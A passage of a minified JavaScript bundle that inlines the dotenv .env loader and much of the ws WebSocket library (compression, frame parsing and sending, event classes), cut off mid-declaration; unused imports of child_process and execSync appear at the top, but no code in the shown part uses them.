import e from"node:path";import t from"fs";import s from"path";import r from"os";import o from"stream";import i from"zlib";import n from"buffer";import a from"crypto";import c from"events";import l from"https";import h from"http";import d from"net";import f from"tls";import u from"url";import p from"child_process";import _ from"node:os";import{execSync as m}from"node:child_process";import{promisify as g}from"node:util";function y(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}var v={exports:{}};const b=t,k=s,S=r,w={name:"dotenv",version:"16.0.3",description:"Loads environment variables from .env file",main:"lib/main.js",types:"lib/main.d.ts",exports:{".":{require:"./lib/main.js",types:"./lib/main.d.ts",default:"./lib/main.js"},"./config":"./config.js","./config.js":"./config.js","./lib/env-options":"./lib/env-options.js","./lib/env-options.js":"./lib/env-options.js","./lib/cli-options":"./lib/cli-options.js","./lib/cli-options.js":"./lib/cli-options.js","./package.json":"./package.json"},scripts:{"dts-check":"tsc --project tests/types/tsconfig.json",lint:"standard","lint-readme":"standard-markdown",pretest:"npm run lint && npm run dts-check",test:"tap tests/*.js --100 -Rspec",prerelease:"npm test",release:"standard-version"},repository:{type:"git",url:"git://github.com/motdotla/dotenv.git"},keywords:["dotenv","env",".env","environment","variables","config","settings"],readmeFilename:"README.md",license:"BSD-2-Clause",devDependencies:{"@types/node":"^17.0.9",decache:"^4.6.1",dtslint:"^3.7.0",sinon:"^12.0.1",standard:"^16.0.4","standard-markdown":"^7.1.0","standard-version":"^9.3.2",tap:"^15.1.6",tar:"^6.1.11",typescript:"^4.5.4"},engines:{node:">=12"}}.version,E=/(?:^|^)\s*(?:export\s+)?([\w.-]+)(?:\s*=\s*?|:\s+?)(\s*'(?:\\'|[^'])*'|\s*"(?:\\"|[^"])*"|\s*`(?:\\`|[^`])*`|[^#\r\n]+)?\s*(?:#.*)?(?:$|$)/gm;function W(e){console.log(`[dotenv@${w}][DEBUG] ${e}`)}const x={config:function(e){let t=k.resolve(process.cwd(),".env"),s="utf8";const r=Boolean(e&&e.debug),o=Boolean(e&&e.override);var i;e&&(null!=e.path&&(t="~"===(i=e.path)[0]?k.join(S.homedir(),i.slice(1)):i),null!=e.encoding&&(s=e.encoding));try{const e=x.parse(b.readFileSync(t,{encoding:s}));return Object.keys(e).forEach((function(t){Object.prototype.hasOwnProperty.call(process.env,t)?(!0===o&&(process.env[t]=e[t]),r&&W(!0===o?`"${t}" is already defined in \`process.env\` and WAS overwritten`:`"${t}" is already defined in \`process.env\` and was NOT overwritten`)):process.env[t]=e[t]})),{parsed:e}}catch(e){return r&&W(`Failed to load ${t} ${e.message}`),{error:e}}},parse:function(e){const t={};let s,r=e.toString();for(r=r.replace(/\r\n?/gm,"\n");null!=(s=E.exec(r));){const e=s[1];let r=s[2]||"";r=r.trim();const o=r[0];r=r.replace(/^(['"`])([\s\S]*)\1$/gm,"$2"),'"'===o&&(r=r.replace(/\\n/g,"\n"),r=r.replace(/\\r/g,"\r")),t[e]=r}return t}};var O=v.exports.config=x.config,C=v.exports.parse=x.parse;v.exports=x;var N=v.exports;function R(e,t,s){const r=function(e,t){const s=Array.from(e.matchAll(t));return s.length>0?s.slice(-1)[0].index:-1}(e,/(?!(?<=\\))\$/g);if(-1===r)return e;const o=e.slice(r).match(/((?!(?<=\\))\${?([\w]+)(?::-([^}\\]*))?}?)/);if(null!=o){const[,r,i,n]=o;return R(e.replace(r,t[i]||n||s.parsed[i]||""),t,s)}return e}function L(e){return e.replace(/\\\$/g,"$")}var P=function(e){const t=e.ignoreProcessEnv?{}:process.env;for(const s in e.parsed){const r=Object.prototype.hasOwnProperty.call(t,s)?t[s]:e.parsed[s];e.parsed[s]=L(R(r,t,e))}for(const s in e.parsed)t[s]=e.parsed[s];return e},T={exports:{}},B={BINARY_TYPES:["nodebuffer","arraybuffer","fragments"],EMPTY_BUFFER:Buffer.alloc(0),GUID:"258EAFA5-E914-47DA-95CA-C5AB0DC85B11",kForOnEventAttribute:Symbol("kIsForOnEventAttribute"),kListener:Symbol("kListener"),kStatusCode:Symbol("status-code"),kWebSocket:Symbol("websocket"),NOOP:()=>{}};const{EMPTY_BUFFER:I}=B,M=Buffer[Symbol.species];function U(e,t,s,r,o){for(let i=0;i<o;i++)s[r+i]=e[i]^t[3&i]}function F(e,t){for(let s=0;s<e.length;s++)e[s]^=t[3&s]}if(T.exports={concat:function(e,t){if(0===e.length)return I;if(1===e.length)return e[0];const s=Buffer.allocUnsafe(t);let r=0;for(let t=0;t<e.length;t++){const o=e[t];s.set(o,r),r+=o.length}return r<t?new M(s.buffer,s.byteOffset,r):s},mask:U,toArrayBuffer:function(e){return e.length===e.buffer.byteLength?e.buffer:e.buffer.slice(e.byteOffset,e.byteOffset+e.length)},toBuffer:function e(t){if(e.readOnly=!0,Buffer.isBuffer(t))return t;let s;return t instanceof ArrayBuffer?s=new M(t):ArrayBuffer.isView(t)?s=new M(t.buffer,t.byteOffset,t.byteLength):(s=Buffer.from(t),e.readOnly=!1),s},unmask:F},!process.env.WS_NO_BUFFER_UTIL)try{const e=require("bufferutil");T.exports.mask=function(t,s,r,o,i){i<48?U(t,s,r,o,i):e.mask(t,s,r,o,i)},T.exports.unmask=function(t,s){t.length<32?F(t,s):e.unmask(t,s)}}catch(e){}var j=T.exports;const D=Symbol("kDone"),G=Symbol("kRun");const A=i,$=j,q=class{constructor(e){this[D]=()=>{this.pending--,this[G]()},this.concurrency=e||1/0,this.jobs=[],this.pending=0}add(e){this.jobs.push(e),this[G]()}[G](){if(this.pending!==this.concurrency&&this.jobs.length){const e=this.jobs.shift();this.pending++,e(this[D])}}},{kStatusCode:V}=B,J=Buffer[Symbol.species],z=Buffer.from([0,0,255,255]),H=Symbol("permessage-deflate"),K=Symbol("total-length"),Q=Symbol("callback"),Y=Symbol("buffers"),Z=Symbol("error");let X;var ee=class{constructor(e,t,s){if(this._maxPayload=0|s,this._options=e||{},this._threshold=void 0!==this._options.threshold?this._options.threshold:1024,this._isServer=!!t,this._deflate=null,this._inflate=null,this.params=null,!X){const e=void 0!==this._options.concurrencyLimit?this._options.concurrencyLimit:10;X=new q(e)}}static get extensionName(){return"permessage-deflate"}offer(){const e={};return this._options.serverNoContextTakeover&&(e.server_no_context_takeover=!0),this._options.clientNoContextTakeover&&(e.client_no_context_takeover=!0),this._options.serverMaxWindowBits&&(e.server_max_window_bits=this._options.serverMaxWindowBits),this._options.clientMaxWindowBits?e.client_max_window_bits=this._options.clientMaxWindowBits:null==this._options.clientMaxWindowBits&&(e.client_max_window_bits=!0),e}accept(e){return e=this.normalizeParams(e),this.params=this._isServer?this.acceptAsServer(e):this.acceptAsClient(e),this.params}cleanup(){if(this._inflate&&(this._inflate.close(),this._inflate=null),this._deflate){const e=this._deflate[Q];this._deflate.close(),this._deflate=null,e&&e(new Error("The deflate stream was closed while data was being processed"))}}acceptAsServer(e){const t=this._options,s=e.find((e=>!(!1===t.serverNoContextTakeover&&e.server_no_context_takeover||e.server_max_window_bits&&(!1===t.serverMaxWindowBits||"number"==typeof t.serverMaxWindowBits&&t.serverMaxWindowBits>e.server_max_window_bits)||"number"==typeof t.clientMaxWindowBits&&!e.client_max_window_bits)));if(!s)throw new Error("None of the extension offers can be accepted");return t.serverNoContextTakeover&&(s.server_no_context_takeover=!0),t.clientNoContextTakeover&&(s.client_no_context_takeover=!0),"number"==typeof t.serverMaxWindowBits&&(s.server_max_window_bits=t.serverMaxWindowBits),"number"==typeof t.clientMaxWindowBits?s.client_max_window_bits=t.clientMaxWindowBits:!0!==s.client_max_window_bits&&!1!==t.clientMaxWindowBits||delete s.client_max_window_bits,s}acceptAsClient(e){const t=e[0];if(!1===this._options.clientNoContextTakeover&&t.client_no_context_takeover)throw new Error('Unexpected parameter "client_no_context_takeover"');if(t.client_max_window_bits){if(!1===this._options.clientMaxWindowBits||"number"==typeof this._options.clientMaxWindowBits&&t.client_max_window_bits>this._options.clientMaxWindowBits)throw new Error('Unexpected or invalid parameter "client_max_window_bits"')}else"number"==typeof this._options.clientMaxWindowBits&&(t.client_max_window_bits=this._options.clientMaxWindowBits);return t}normalizeParams(e){return e.forEach((e=>{Object.keys(e).forEach((t=>{let s=e[t];if(s.length>1)throw new Error(`Parameter "${t}" must have only a single value`);if(s=s[0],"client_max_window_bits"===t){if(!0!==s){const e=+s;if(!Number.isInteger(e)||e<8||e>15)throw new TypeError(`Invalid value for parameter "${t}": ${s}`);s=e}else if(!this._isServer)throw new TypeError(`Invalid value for parameter "${t}": ${s}`)}else if("server_max_window_bits"===t){const e=+s;if(!Number.isInteger(e)||e<8||e>15)throw new TypeError(`Invalid value for parameter "${t}": ${s}`);s=e}else{if("client_no_context_takeover"!==t&&"server_no_context_takeover"!==t)throw new Error(`Unknown parameter "${t}"`);if(!0!==s)throw new TypeError(`Invalid value for parameter "${t}": ${s}`)}e[t]=s}))})),e}decompress(e,t,s){X.add((r=>{this._decompress(e,t,((e,t)=>{r(),s(e,t)}))}))}compress(e,t,s){X.add((r=>{this._compress(e,t,((e,t)=>{r(),s(e,t)}))}))}_decompress(e,t,s){const r=this._isServer?"client":"server";if(!this._inflate){const e=`${r}_max_window_bits`,t="number"!=typeof this.params[e]?A.Z_DEFAULT_WINDOWBITS:this.params[e];this._inflate=A.createInflateRaw({...this._options.zlibInflateOptions,windowBits:t}),this._inflate[H]=this,this._inflate[K]=0,this._inflate[Y]=[],this._inflate.on("error",re),this._inflate.on("data",se)}this._inflate[Q]=s,this._inflate.write(e),t&&this._inflate.write(z),this._inflate.flush((()=>{const e=this._inflate[Z];if(e)return this._inflate.close(),this._inflate=null,void s(e);const o=$.concat(this._inflate[Y],this._inflate[K]);this._inflate._readableState.endEmitted?(this._inflate.close(),this._inflate=null):(this._inflate[K]=0,this._inflate[Y]=[],t&&this.params[`${r}_no_context_takeover`]&&this._inflate.reset()),s(null,o)}))}_compress(e,t,s){const r=this._isServer?"server":"client";if(!this._deflate){const e=`${r}_max_window_bits`,t="number"!=typeof this.params[e]?A.Z_DEFAULT_WINDOWBITS:this.params[e];this._deflate=A.createDeflateRaw({...this._options.zlibDeflateOptions,windowBits:t}),this._deflate[K]=0,this._deflate[Y]=[],this._deflate.on("data",te)}this._deflate[Q]=s,this._deflate.write(e),this._deflate.flush(A.Z_SYNC_FLUSH,(()=>{if(!this._deflate)return;let e=$.concat(this._deflate[Y],this._deflate[K]);t&&(e=new J(e.buffer,e.byteOffset,e.length-4)),this._deflate[Q]=null,this._deflate[K]=0,this._deflate[Y]=[],t&&this.params[`${r}_no_context_takeover`]&&this._deflate.reset(),s(null,e)}))}};function te(e){this[Y].push(e),this[K]+=e.length}function se(e){this[K]+=e.length,this[H]._maxPayload<1||this[K]<=this[H]._maxPayload?this[Y].push(e):(this[Z]=new RangeError("Max payload size exceeded"),this[Z].code="WS_ERR_UNSUPPORTED_MESSAGE_LENGTH",this[Z][V]=1009,this.removeListener("data",se),this.reset())}function re(e){this[H]._inflate=null,e[V]=1007,this[Q](e)}var oe={exports:{}};const{isUtf8:ie}=n;function ne(e){const t=e.length;let s=0;for(;s<t;)if(0==(128&e[s]))s++;else if(192==(224&e[s])){if(s+1===t||128!=(192&e[s+1])||192==(254&e[s]))return!1;s+=2}else if(224==(240&e[s])){if(s+2>=t||128!=(192&e[s+1])||128!=(192&e[s+2])||224===e[s]&&128==(224&e[s+1])||237===e[s]&&160==(224&e[s+1]))return!1;s+=3}else{if(240!=(248&e[s]))return!1;if(s+3>=t||128!=(192&e[s+1])||128!=(192&e[s+2])||128!=(192&e[s+3])||240===e[s]&&128==(240&e[s+1])||244===e[s]&&e[s+1]>143||e[s]>244)return!1;s+=4}return!0}if(oe.exports={isValidStatusCode:function(e){return e>=1e3&&e<=1014&&1004!==e&&1005!==e&&1006!==e||e>=3e3&&e<=4999},isValidUTF8:ne,tokenChars:[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,1,1,1,0,0,1,1,0,1,1,0,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,0,1,0]},ie)oe.exports.isValidUTF8=function(e){return e.length<24?ne(e):ie(e)};else if(!process.env.WS_NO_UTF_8_VALIDATE)try{const e=require("utf-8-validate");oe.exports.isValidUTF8=function(t){return t.length<32?ne(t):e(t)}}catch(e){}var ae=oe.exports;const{Writable:ce}=o,le=ee,{BINARY_TYPES:he,EMPTY_BUFFER:de,kStatusCode:fe,kWebSocket:ue}=B,{concat:pe,toArrayBuffer:_e,unmask:me}=j,{isValidStatusCode:ge,isValidUTF8:ye}=ae,ve=Buffer[Symbol.species],be=Promise.resolve(),ke="function"==typeof queueMicrotask?queueMicrotask:function(e){be.then(e).catch(We)};var Se=class extends ce{constructor(e={}){super(),this._allowMultipleEventsPerMicrotask=!!e.allowMultipleEventsPerMicrotask,this._binaryType=e.binaryType||he[0],this._extensions=e.extensions||{},this._isServer=!!e.isServer,this._maxPayload=0|e.maxPayload,this._skipUTF8Validation=!!e.skipUTF8Validation,this[ue]=void 0,this._bufferedBytes=0,this._buffers=[],this._compressed=!1,this._payloadLength=0,this._mask=void 0,this._fragmented=0,this._masked=!1,this._fin=!1,this._opcode=0,this._totalPayloadLength=0,this._messageLength=0,this._fragments=[],this._state=0,this._loop=!1}_write(e,t,s){if(8===this._opcode&&0==this._state)return s();this._bufferedBytes+=e.length,this._buffers.push(e),this.startLoop(s)}consume(e){if(this._bufferedBytes-=e,e===this._buffers[0].length)return this._buffers.shift();if(e<this._buffers[0].length){const t=this._buffers[0];return this._buffers[0]=new ve(t.buffer,t.byteOffset+e,t.length-e),new ve(t.buffer,t.byteOffset,e)}const t=Buffer.allocUnsafe(e);do{const s=this._buffers[0],r=t.length-e;e>=s.length?t.set(this._buffers.shift(),r):(t.set(new Uint8Array(s.buffer,s.byteOffset,e),r),this._buffers[0]=new ve(s.buffer,s.byteOffset+e,s.length-e)),e-=s.length}while(e>0);return t}startLoop(e){let t;this._loop=!0;do{switch(this._state){case 0:t=this.getInfo();break;case 1:t=this.getPayloadLength16();break;case 2:t=this.getPayloadLength64();break;case 3:this.getMask();break;case 4:t=this.getData(e);break;case 5:return void(this._loop=!1);default:return this._loop=!1,void ke((()=>{this._state=0,this.startLoop(e)}))}}while(this._loop);e(t)}getInfo(){if(this._bufferedBytes<2)return void(this._loop=!1);const e=this.consume(2);if(0!=(48&e[0]))return this._loop=!1,we(RangeError,"RSV2 and RSV3 must be clear",!0,1002,"WS_ERR_UNEXPECTED_RSV_2_3");const t=64==(64&e[0]);if(t&&!this._extensions[le.extensionName])return this._loop=!1,we(RangeError,"RSV1 must be clear",!0,1002,"WS_ERR_UNEXPECTED_RSV_1");if(this._fin=128==(128&e[0]),this._opcode=15&e[0],this._payloadLength=127&e[1],0===this._opcode){if(t)return this._loop=!1,we(RangeError,"RSV1 must be clear",!0,1002,"WS_ERR_UNEXPECTED_RSV_1");if(!this._fragmented)return this._loop=!1,we(RangeError,"invalid opcode 0",!0,1002,"WS_ERR_INVALID_OPCODE");this._opcode=this._fragmented}else if(1===this._opcode||2===this._opcode){if(this._fragmented)return this._loop=!1,we(RangeError,`invalid opcode ${this._opcode}`,!0,1002,"WS_ERR_INVALID_OPCODE");this._compressed=t}else{if(!(this._opcode>7&&this._opcode<11))return this._loop=!1,we(RangeError,`invalid opcode ${this._opcode}`,!0,1002,"WS_ERR_INVALID_OPCODE");if(!this._fin)return this._loop=!1,we(RangeError,"FIN must be set",!0,1002,"WS_ERR_EXPECTED_FIN");if(t)return this._loop=!1,we(RangeError,"RSV1 must be clear",!0,1002,"WS_ERR_UNEXPECTED_RSV_1");if(this._payloadLength>125||8===this._opcode&&1===this._payloadLength)return this._loop=!1,we(RangeError,`invalid payload length ${this._payloadLength}`,!0,1002,"WS_ERR_INVALID_CONTROL_PAYLOAD_LENGTH")}if(this._fin||this._fragmented||(this._fragmented=this._opcode),this._masked=128==(128&e[1]),this._isServer){if(!this._masked)return this._loop=!1,we(RangeError,"MASK must be set",!0,1002,"WS_ERR_EXPECTED_MASK")}else if(this._masked)return this._loop=!1,we(RangeError,"MASK must be clear",!0,1002,"WS_ERR_UNEXPECTED_MASK");if(126===this._payloadLength)this._state=1;else{if(127!==this._payloadLength)return this.haveLength();this._state=2}}getPayloadLength16(){if(!(this._bufferedBytes<2))return this._payloadLength=this.consume(2).readUInt16BE(0),this.haveLength();this._loop=!1}getPayloadLength64(){if(this._bufferedBytes<8)return void(this._loop=!1);const e=this.consume(8),t=e.readUInt32BE(0);return t>Math.pow(2,21)-1?(this._loop=!1,we(RangeError,"Unsupported WebSocket frame: payload length > 2^53 - 1",!1,1009,"WS_ERR_UNSUPPORTED_DATA_PAYLOAD_LENGTH")):(this._payloadLength=t*Math.pow(2,32)+e.readUInt32BE(4),this.haveLength())}haveLength(){if(this._payloadLength&&this._opcode<8&&(this._totalPayloadLength+=this._payloadLength,this._totalPayloadLength>this._maxPayload&&this._maxPayload>0))return this._loop=!1,we(RangeError,"Max payload size exceeded",!1,1009,"WS_ERR_UNSUPPORTED_MESSAGE_LENGTH");this._masked?this._state=3:this._state=4}getMask(){this._bufferedBytes<4?this._loop=!1:(this._mask=this.consume(4),this._state=4)}getData(e){let t=de;if(this._payloadLength){if(this._bufferedBytes<this._payloadLength)return void(this._loop=!1);t=this.consume(this._payloadLength),this._masked&&0!=(this._mask[0]|this._mask[1]|this._mask[2]|this._mask[3])&&me(t,this._mask)}return this._opcode>7?this.controlMessage(t):this._compressed?(this._state=5,void this.decompress(t,e)):(t.length&&(this._messageLength=this._totalPayloadLength,this._fragments.push(t)),this.dataMessage())}decompress(e,t){this._extensions[le.extensionName].decompress(e,this._fin,((e,s)=>{if(e)return t(e);if(s.length){if(this._messageLength+=s.length,this._messageLength>this._maxPayload&&this._maxPayload>0)return t(we(RangeError,"Max payload size exceeded",!1,1009,"WS_ERR_UNSUPPORTED_MESSAGE_LENGTH"));this._fragments.push(s)}const r=this.dataMessage();if(r)return t(r);this.startLoop(t)}))}dataMessage(){if(this._fin){const e=this._messageLength,t=this._fragments;if(this._totalPayloadLength=0,this._messageLength=0,this._fragmented=0,this._fragments=[],2===this._opcode){let s;s="nodebuffer"===this._binaryType?pe(t,e):"arraybuffer"===this._binaryType?_e(pe(t,e)):t,this.emit("message",s,!0)}else{const s=pe(t,e);if(!this._skipUTF8Validation&&!ye(s))return this._loop=!1,we(Error,"invalid UTF-8 sequence",!0,1007,"WS_ERR_INVALID_UTF8");this.emit("message",s,!1)}}this._state=this._allowMultipleEventsPerMicrotask?0:6}controlMessage(e){if(8!==this._opcode)this.emit(9===this._opcode?"ping":"pong",e),this._state=this._allowMultipleEventsPerMicrotask?0:6;else{if(this._loop=!1,0===e.length)this.emit("conclude",1005,de),this.end();else{const t=e.readUInt16BE(0);if(!ge(t))return we(RangeError,`invalid status code ${t}`,!0,1002,"WS_ERR_INVALID_CLOSE_CODE");const s=new ve(e.buffer,e.byteOffset+2,e.length-2);if(!this._skipUTF8Validation&&!ye(s))return we(Error,"invalid UTF-8 sequence",!0,1007,"WS_ERR_INVALID_UTF8");this.emit("conclude",t,s),this.end()}this._state=0}}};function we(e,t,s,r,o){const i=new e(s?`Invalid WebSocket frame: ${t}`:t);return Error.captureStackTrace(i,we),i.code=o,i[fe]=r,i}function Ee(e){throw e}function We(e){process.nextTick(Ee,e)}const{randomFillSync:xe}=a,Oe=ee,{EMPTY_BUFFER:Ce}=B,{isValidStatusCode:Ne}=ae,{mask:Re,toBuffer:Le}=j,Pe=Symbol("kByteLength"),Te=Buffer.alloc(4);class Be{constructor(e,t,s){this._extensions=t||{},s&&(this._generateMask=s,this._maskBuffer=Buffer.alloc(4)),this._socket=e,this._firstFragment=!0,this._compress=!1,this._bufferedBytes=0,this._deflating=!1,this._queue=[]}static frame(e,t){let s,r,o=!1,i=2,n=!1;t.mask&&(s=t.maskBuffer||Te,t.generateMask?t.generateMask(s):xe(s,0,4),n=0==(s[0]|s[1]|s[2]|s[3]),i=6),"string"==typeof e?r=t.mask&&!n||void 0===t[Pe]?(e=Buffer.from(e)).length:t[Pe]:(r=e.length,o=t.mask&&t.readOnly&&!n);let a=r;r>=65536?(i+=8,a=127):r>125&&(i+=2,a=126);const c=Buffer.allocUnsafe(o?r+i:i);return c[0]=t.fin?128|t.opcode:t.opcode,t.rsv1&&(c[0]|=64),c[1]=a,126===a?c.writeUInt16BE(r,2):127===a&&(c[2]=c[3]=0,c.writeUIntBE(r,4,6)),t.mask?(c[1]|=128,c[i-4]=s[0],c[i-3]=s[1],c[i-2]=s[2],c[i-1]=s[3],n?[c,e]:o?(Re(e,s,c,i,r),[c]):(Re(e,s,e,0,r),[c,e])):[c,e]}close(e,t,s,r){let o;if(void 0===e)o=Ce;else{if("number"!=typeof e||!Ne(e))throw new TypeError("First argument must be a valid error code number");if(void 0!==t&&t.length){const s=Buffer.byteLength(t);if(s>123)throw new RangeError("The message must not be greater than 123 bytes");o=Buffer.allocUnsafe(2+s),o.writeUInt16BE(e,0),"string"==typeof t?o.write(t,2):o.set(t,2)}else o=Buffer.allocUnsafe(2),o.writeUInt16BE(e,0)}const i={[Pe]:o.length,fin:!0,generateMask:this._generateMask,mask:s,maskBuffer:this._maskBuffer,opcode:8,readOnly:!1,rsv1:!1};this._deflating?this.enqueue([this.dispatch,o,!1,i,r]):this.sendFrame(Be.frame(o,i),r)}ping(e,t,s){let r,o;if("string"==typeof e?(r=Buffer.byteLength(e),o=!1):(r=(e=Le(e)).length,o=Le.readOnly),r>125)throw new RangeError("The data size must not be greater than 125 bytes");const i={[Pe]:r,fin:!0,generateMask:this._generateMask,mask:t,maskBuffer:this._maskBuffer,opcode:9,readOnly:o,rsv1:!1};this._deflating?this.enqueue([this.dispatch,e,!1,i,s]):this.sendFrame(Be.frame(e,i),s)}pong(e,t,s){let r,o;if("string"==typeof e?(r=Buffer.byteLength(e),o=!1):(r=(e=Le(e)).length,o=Le.readOnly),r>125)throw new RangeError("The data size must not be greater than 125 bytes");const i={[Pe]:r,fin:!0,generateMask:this._generateMask,mask:t,maskBuffer:this._maskBuffer,opcode:10,readOnly:o,rsv1:!1};this._deflating?this.enqueue([this.dispatch,e,!1,i,s]):this.sendFrame(Be.frame(e,i),s)}send(e,t,s){const r=this._extensions[Oe.extensionName];let o,i,n=t.binary?2:1,a=t.compress;if("string"==typeof e?(o=Buffer.byteLength(e),i=!1):(o=(e=Le(e)).length,i=Le.readOnly),this._firstFragment?(this._firstFragment=!1,a&&r&&r.params[r._isServer?"server_no_context_takeover":"client_no_context_takeover"]&&(a=o>=r._threshold),this._compress=a):(a=!1,n=0),t.fin&&(this._firstFragment=!0),r){const r={[Pe]:o,fin:t.fin,generateMask:this._generateMask,mask:t.mask,maskBuffer:this._maskBuffer,opcode:n,readOnly:i,rsv1:a};this._deflating?this.enqueue([this.dispatch,e,this._compress,r,s]):this.dispatch(e,this._compress,r,s)}else this.sendFrame(Be.frame(e,{[Pe]:o,fin:t.fin,generateMask:this._generateMask,mask:t.mask,maskBuffer:this._maskBuffer,opcode:n,readOnly:i,rsv1:!1}),s)}dispatch(e,t,s,r){if(!t)return void this.sendFrame(Be.frame(e,s),r);const o=this._extensions[Oe.extensionName];this._bufferedBytes+=s[Pe],this._deflating=!0,o.compress(e,s.fin,((e,t)=>{if(this._socket.destroyed){const e=new Error("The socket was closed while data was being compressed");"function"==typeof r&&r(e);for(let t=0;t<this._queue.length;t++){const s=this._queue[t],r=s[s.length-1];"function"==typeof r&&r(e)}}else this._bufferedBytes-=s[Pe],this._deflating=!1,s.readOnly=!1,this.sendFrame(Be.frame(t,s),r),this.dequeue()}))}dequeue(){for(;!this._deflating&&this._queue.length;){const e=this._queue.shift();this._bufferedBytes-=e[3][Pe],Reflect.apply(e[0],this,e.slice(1))}}enqueue(e){this._bufferedBytes+=e[3][Pe],this._queue.push(e)}sendFrame(e,t){2===e.length?(this._socket.cork(),this._socket.write(e[0]),this._socket.write(e[1],t),this._socket.uncork()):this._socket.write(e[0],t)}}var Ie=Be;const{kForOnEventAttribute:Me,kListener:Ue}=B,Fe=Symbol("kCode"),je=Symbol("kData"),De=Symbol("kError"),Ge=Symbol("kMessage"),Ae=Symbol("kReason"),$e=Symbol("kTarget"),qe=Symbol("kType"),Ve=Symbol("kWasClean");class Je{constructor(e){this[$e]=null,this[qe]=e}get target(){return this[$e]}get type(){return this[qe]}}Object.defineProperty(Je.prototype,"target",{enumerable:!0}),Object.defineProperty(Je.prototype,"type",{enumerable:!0});class ze extends Je{constructor(e,t={}){super(e),this[Fe]=void 0===t.code?0:t.code,this[Ae]=void 0===t.reason?"":t.reason,this[Ve]=void 0!==t.wasClean&&t.wasClean}get code(){return this[Fe]}get reason(){return this[Ae]}get wasClean(){return this[Ve]}}Object.defineProperty(ze.prototype,"code",{enumerable:!0}),Object.defineProperty(ze.prototype,"reason",{enumerable:!0}),Object.defineProperty(ze.prototype,"wasClean",{enumerable:!0});class He extends Je{constructor(e,t={}){super(e),this[De]=void 0===t.error?null:t.error,this[Ge]=void 0===t.message?"":t.message}get error(){return this[De]}get message(){return this[Ge]}}Object.defineProperty(He.prototype,"error",{enumerable:!0}),Object.defineProperty(He.prototype,"message",{enumerable:!0});class Ke extends Je{constructor(e,t={}){super(e),this[je]=void 0===t.data?null:t.data}get data(){return this[je]}}Object.defineProperty(Ke.prototype,"data",{enumerable:!0});const Qe={addEventListener(e,t,s={}){for(const r of this.listeners(e))if(!s[Me]&&r[Ue]===t&&!r[Me])return;let r;if("message"===e)r=function(e,s){const r=new Ke("message",{data:s?e:e.toString()});r[$e]=this,Ze(t,this,r)};else if("close"===e)r=function(e,s){const r=new ze("close",{code:e,reason:s.toString(),wasClean:this._closeFrameReceived&&this._closeFrameSent});r[$e]=this,Ze(t,this,r)};else if("error"===e)r=function(e){const s=new He("error",{error:e,message:e.message});s[$e]=this,Ze(t,this,s)};else{if("open"!==e)return;r=function(){const e=new Je("open");e[$e]=this,Ze(t,this,e)}}r[Me]=!!s[Me],r[Ue]=t,s.once?this.once(e,r):this.on(e,r)},removeEventListener(e,t){for(const s of this.listeners(e))if(s[Ue]===t&&!s[Me]){this.removeListener(e,s);break}}};var Ye={CloseEvent:ze,ErrorEvent:He,Event:Je,EventTarget:Qe,MessageEvent:Ke};function Ze(e,t,s){"object"==typeof e&&e.handleEvent?e.handleEvent.call(e,s):e.call(t,s)}const{tokenChars:Xe}=ae;function et(e,t,s){void 0===e[t]?e[t]=[s]:e[t].push(s)}var tt={format:function(e){return Object.keys(e).map((t=>{let s=e[t];return Array.isArray(s)||(s=[s]),s.map((e=>[t].concat(Object.keys(e).map((t=>{let s=e[t];return Array.isArray(s)||(s=[s]),s.map((e=>!0===e?t:`${t}=${e}`)).join("; ")}))).join("; "))).join(", ")})).join(", ")},parse:function(e){const t=Object.create(null);let s,r,o=Object.create(null),i=!1,n=!1,a=!1,c=-1,l=-1,h=-1,d=0;for(;d<e.length;d++)if(l=e.charCodeAt(d),void 0===s)if(-1===h&&1===Xe[l])-1===c&&(c=d);else if(0===d||32!==l&&9!==l){if(59!==l&&44!==l)throw new SyntaxError(`Unexpected character at index ${d}`);{if(-1===c)throw new SyntaxError(`Unexpected character at index ${d}`);-1===h&&(h=d);const r=e.slice(c,h);44===l?(et(t,r,o),o=Object.create(null)):s=r,c=h=-1}}else-1===h&&-1!==c&&(h=d);else if(void 0===r)if(-1===h&&1===Xe[l])-1===c&&(c=d);else if(32===l||9===l)-1===h&&-1!==c&&(h=d);else if(59===l||44===l){if(-1===c)throw new SyntaxError(`Unexpected character at index ${d}`);-1===h&&(h=d),et(o,e.slice(c,h),!0),44===l&&(et(t,s,o),o=Object.create(null),s=void 0),c=h=-1}else{if(61!==l||-1===c||-1!==h)throw new SyntaxError(`Unexpected character at index ${d}`);r=e.slice(c,d),c=h=-1}else if(n){if(1!==Xe[l])throw new SyntaxError(`Unexpected character at index ${d}`);-1===c?c=d:i||(i=!0),n=!1}else if(a)if(1===Xe[l])-1===c&&(c=d);else if(34===l&&-1!==c)a=!1,h=d;else{if(92!==l)throw new SyntaxError(`Unexpected character at index ${d}`);n=!0}else if(34===l&&61===e.charCodeAt(d-1))a=!0;else if(-1===h&&1===Xe[l])-1===c&&(c=d);else if(-1===c||32!==l&&9!==l){if(59!==l&&44!==l)throw new SyntaxError(`Unexpected character at index ${d}`);{if(-1===c)throw new SyntaxError(`Unexpected character at index ${d}`);-1===h&&(h=d);let n=e.slice(c,h);i&&(n=n.replace(/\\/g,""),i=!1),et(o,r,n),44===l&&(et(t,s,o),o=Object.create(null),s=void 0),r=void 0,c=h=-1}}else-1===h&&(h=d);if(-1===c||a||32===l||9===l)throw new SyntaxError("Unexpected end of input");-1===h&&(h=d);const f=e.slice(c,h);return void 0===s?et(t,f,o):(void 0===r?et(o,f,!0):et(o,r,i?f.replace(/\\/g,""):f),et(t,s,o)),t}};const st=c,rt=l,ot=h,it=d,nt=f,{randomBytes:at,createHash:ct}=a,{URL:lt}=u,ht=ee,dt=Se,ft=Ie,{BINARY_TYPES:ut,EMPTY_BUFFER:pt,GUID:_t,kForOnEventAttribute:mt,kListener:gt,kStatusCode:yt,kWebSocket:vt,NOOP:bt}=B,{EventTarget:{addEventListener:kt,removeEventListener:St}}=Ye,{format:wt,parse:Et}=tt,{toBuffer:Wt}=j,xt=Symbol("kAborted"),Ot=[8,13],Ct=["CONNECTING","OPEN","CLOSING","CLOSED"],Nt=/^[!#$%&'*+\-.0-9A-Z^_`|a-z~]+$/;class 